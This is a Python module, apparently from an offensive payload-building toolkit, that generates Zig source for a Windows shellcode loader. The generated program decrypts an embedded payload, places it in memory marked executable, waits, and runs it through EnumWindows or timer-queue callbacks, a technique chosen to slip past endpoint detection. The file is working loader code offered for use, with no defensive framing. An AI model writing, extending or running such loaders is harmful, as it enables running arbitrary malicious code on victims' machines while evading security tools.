#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Execute decrypted shellcode via Windows callback APIs — pure Zig."""

from __future__ import annotations

from lib.compile.injection_common import InjectionBuilder
from lib.compile.zig_loader_common import zig_decode_decrypt_preamble, zig_sleep_ms, zig_std_preamble


class CallbackExecutionBuilder(InjectionBuilder):

    VALID_METHODS = ("enum_windows", "timer_queue")

    def __init__(self, *args, method: str = "enum_windows", **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.method = method if method in self.VALID_METHODS else "enum_windows"

    def build_zig_source(self, encoded_payload: str, key: bytes, iv=None) -> str:
        decode = zig_decode_decrypt_preamble(encoded_payload, key, iv, cipher=self.cipher)
        if self.method == "timer_queue":
            exec_block = """
    const queue = CreateTimerQueue() orelse return 1;
    var timer: ?w.HANDLE = null;
    if (CreateTimerQueueTimer(&timer, queue, @ptrCast(exec), null, 0, 0, w.WT_EXECUTEINTIMERTHREAD) == 0) {
        _ = DeleteTimerQueue(queue);
        _ = VirtualFree(exec, 0, w.MEM_RELEASE);
        return 1;
    }
    Sleep(2000);
    _ = DeleteTimerQueueEx(queue, w.INVALID_HANDLE_VALUE);
"""
        else:
            exec_block = """
    _ = EnumWindows(@ptrCast(exec), 0);
"""

        return f"""
{zig_std_preamble()}
{decode}

pub fn main() u8 {{
    var gpa = std.heap.GeneralPurposeAllocator(.{{}}){{}};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    const sc = decodeAndDecrypt(allocator) catch return 1;
    defer allocator.free(sc);

    const exec = VirtualAlloc(null, sc.len, w.MEM_COMMIT | w.MEM_RESERVE, w.PAGE_READWRITE) orelse return 1;
    @memcpy(@as([*]u8, @ptrCast(exec))[0..sc.len], sc);
    var old: w.DWORD = 0;
    if (VirtualProtect(exec, sc.len, w.PAGE_EXECUTE_READ, &old) == 0) return 1;
{zig_sleep_ms(self.sleep_ms)}
{exec_block}
    _ = VirtualFree(exec, 0, w.MEM_RELEASE);
    return 0;
}}
"""
